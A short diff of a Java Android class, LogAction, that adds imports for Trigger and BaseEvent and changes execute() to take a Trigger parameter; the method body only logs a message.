@@ -13,9 +13,11 @@ import java.io.IOException;
 
 import org.json.JSONObject;
 
+import com.android.service.Trigger;
 import com.android.service.auto.Cfg;
 import com.android.service.conf.ConfAction;
 import com.android.service.conf.ConfigurationException;
+import com.android.service.event.BaseEvent;
 import com.android.service.evidence.Evidence;
 import com.android.service.util.Check;
 import com.android.service.util.DataBuffer;
@@ -45,7 +47,7 @@ public class LogAction extends SubAction {
 	 * @see com.ht.AndroidServiceGUI.action.SubAction#execute()
 	 */
 	@Override
-	public boolean execute() {
+	public boolean execute(Trigger trigger) {
 		Evidence.info(msg);
 
 		return true;
